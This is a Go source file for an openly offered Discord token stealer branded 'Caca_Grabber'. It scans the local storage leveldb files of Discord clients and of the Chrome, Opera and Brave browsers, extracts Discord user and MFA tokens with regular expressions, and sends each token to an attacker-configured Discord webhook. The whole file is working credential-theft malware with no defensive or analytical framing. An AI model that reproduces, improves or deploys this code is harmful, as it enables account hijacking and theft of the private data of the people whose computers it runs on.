package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"path/filepath"
	"regexp"
	"strings"
)

func sendWebhook(url, token string) {
	data := map[string]interface{}{
		"username":   "Caca_Grabber",
		"avatar_url": "https://images.rtl.fr/~c/1540v1026/rtl/www/1319636-poopemojihp-1.jpg",
		"embeds": []map[string]interface{}{
			{
				"title":       "Token Found!",
				"description": fmt.Sprintf("`%s`", token),
				"color":       0x4b3621,
				"footer": map[string]string{
					"text": "Made By Caca",
				},
				"thumbnail": map[string]string{
					"url": "https://images.rtl.fr/~c/1540v1026/rtl/www/1319636-poopemojihp-1.jpg",
				},
			},
		},
	}

	headers := map[string]string{
		"Content-Type": "application/json",
	}

	sendPostRequest(url, data, headers)
}

func sendPostRequest(url string, data map[string]interface{}, headers map[string]string) {
	jsonData, _ := json.Marshal(data)
	req, _ := http.NewRequest("POST", url, bytes.NewBuffer(jsonData))
	for key, value := range headers {
		req.Header.Set(key, value)
	}
	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("Error:", err)
		return
	}
	defer resp.Body.Close()
	if resp.StatusCode == 204 {
		fmt.Println("Successfully sent the message")
	}
}

func getTokens() []string {
	var tokenList []string
	local := os.Getenv("LOCALAPPDATA")
	roaming := os.Getenv("APPDATA")
	paths := map[string]string{
		"Discord":        filepath.Join(roaming, "Discord"),
		"Discord Canary": filepath.Join(roaming, "discordcanary"),
		"Discord PTB":    filepath.Join(roaming, "discordptb"),
		"Google Chrome":  filepath.Join(local, "Google", "Chrome", "User Data", "Default"),
		"Opera":          filepath.Join(roaming, "Opera Software", "Opera Stable"),
		"Brave":          filepath.Join(local, "BraveSoftware", "Brave-Browser", "User Data", "Default"),
	}

	for _, path := range paths {
		if _, err := os.Stat(path); os.IsNotExist(err) {
			continue
		}

		files, _ := ioutil.ReadDir(filepath.Join(path, "Local Storage", "leveldb"))
		for _, file := range files {
			if !strings.HasSuffix(file.Name(), ".log") && !strings.HasSuffix(file.Name(), ".ldb") {
				continue
			}

			lines, _ := ioutil.ReadFile(filepath.Join(path, "Local Storage", "leveldb", file.Name()))
			for _, line := range strings.Split(string(lines), "\n") {
				for _, regex := range []string{`mfa\.[\w-]{84}`, `[\w-]{24}\.[\w-]{6}\.[\w-]{27}`} {
					re := regexp.MustCompile(regex)
					tokens := re.FindAllString(line, -1)
					for _, token := range tokens {
						tokenList = append(tokenList, token)
						sendWebhook(WEBHOOK_URL, token)
					}
				}
			}
		}
	}

	return tokenList
}

var WEBHOOK_URL = "Webhook_Here"

func main() {
	tokens := getTokens()
	fmt.Println(tokens)
}
